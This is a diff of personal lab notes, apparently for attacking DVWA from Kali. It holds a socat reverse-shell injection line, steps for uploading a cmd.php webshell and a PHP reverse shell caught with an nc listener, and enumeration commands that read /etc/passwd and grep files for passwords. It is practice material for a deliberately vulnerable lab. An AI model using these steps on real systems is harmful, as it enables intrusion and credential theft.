@@ -110,9 +110,56 @@ some database queries to the database server application in Box A. Then, the dat
  <ul>8.8.8.8; socat tcp-connect:[IP address of Kali] exec:bash,pty,stderr,setsid,sigint</ul>
  <ul>at this point, our connection should be established in the terminal windows where we created the TCP listener and we are now in the server</ul>
 </ol></p>
-<h1>Brute Force</h1>
+<h1>Reverse shell with PHP</h1>
+<p>This topic is about <b>File Inclusion Vulnerabilities</b>. We have <b>Remote File Inclusion</b> and we have <b>Local File Inclusion</b>. These vulnerabilities 
+are often found in poorly-written web applications. These vulnerabilities occur when a web application allows the user to submit input into files or upload files 
+to the web server. <b>LFI</b> allows an attacker to read (and sometimes execute) files on the victim machine. This can be very dangerous because if the web 
+server is misconfigured and running with high privileges, the attacker may gain access to sensitive information. If the attacker is able to place code on the 
+web server through other means, then they may be able to execute arbitrary commands. <b>RFI</b> are easier to exploit but less common.</p>
+<h2>LFI</h2>
+<p>When looking at http://192.168.1.69/dvwa/vulnerabilities/upload/ we can see it's possible to upload (PHP) files. I created a file named <a target=_blank href=https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/cmd.php>cmd.php</a> 
+and uploaded it to DVWA.</p>
+<p><ol>
+    <ul>http://192.168.1.69/dvwa/hackable/uploads/cmd.php?cmd=[Linux command(s)]</ul>
+    <ul>http://192.168.1.69/dvwa/hackable/uploads/cmd.php?cmd=head /etc/passwd</ul>
+</ol></p>
+<h2>RFI</h2>
+<p>If we want to make it a bit more difficult, we can also use RFI</p>   
+<p><ol>
+<ul>Kali has a collection of webshells at /usr/share/webshells</ul>
+<ul>In the php folder a file named php-reverse-shell.php exists</ul>
+<ul>nano php-reverse-shell.php and change the value at $ip into the IP address of the Kali machine and use port 1234</ul>
+<ul>Use a webbrowser to go to http://192.168.1.69/dvwa</ul>
+<ul>Upload php-reverse-shell.php to the webserver, if it doesn't work immediately just try again</ul>
+<ul>In the terminal type: nc -nlvp 1234</ul>
+<ul>In the webbrowser, go to http://192.168.1.69/dvwa/hackable/uploads/php-reverse-shell.php</ul>
+<ul>If everything went well we now have a reverse shell in the console</ul>
+</ol></p>
+    <h2>/etc/passwd</h2>
+    <p>It's always a good idea to read the contents of /etc/passwd</p>
+    <p><ol>
+        <ul>cat /etc/passwd</ul>
+    </ol></p>
+<p>The /etc/passwd file is the cornerstone of user account management, serving as the first line of defense against unauthorized access. /etc/passwd holds important user account details and stores user 
+    data such as home directories, shell preferences, usernames, user IDs, group IDs etc. Any user with a user ID above 1000 isn't a default user and has been added to the system. The password column contains an X, 
+    indicating that the password is stored in the /etc/shadow file.</p>
+    <h2>Basic System Enumeration</h2>
+    <p><ol>
+        <ul>uname -a</ul>
+        <ul>hostname</ul>
+        <ul>lscpu</ul>
+        <ul>ls /home</ul>
+        <ul>ls /var/www/html</ul>
+        <ul>ls /var/www/</ul>
+        <ul>ps aux | grep root</ul>
+        <ul>netstat -tulpn</ul>
+        <ul>ps -aux | grep root | grep mysql</ul>
+        <ul>ifconfig</ul>
+        <ul>find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \;</ul>
+        <ul>locate pass | more</ul>
+    </ol></p>
 
 
 
 <h1>To be continued ...</h1>
-<a target=_blank href=https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/cmd.php>cmd.php commands</a>
+
